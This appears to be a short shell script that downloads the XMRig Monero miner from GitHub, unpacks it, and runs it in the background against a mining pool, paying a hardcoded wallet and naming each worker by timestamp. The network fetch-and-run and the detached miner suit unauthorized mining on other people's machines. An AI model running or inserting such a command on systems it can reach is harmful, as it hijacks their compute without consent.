wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvf xmrig-6.15.2-linux-static-x64.tar.gz && cd xmrig-6.15.2
myworker=$(date +'%d%m_%H%M%S')
./xmrig -o pool.minexmr.com:4444 -u 4Ahd3Nv3DxMNp5wv1SxoT2NL1BjowyfoxLXnv6mfpTNFb5uYcicH9QZZzVTke2X6it1Qicv8VALuN46xbsdMZhWaVg6KuVf.$myworker &
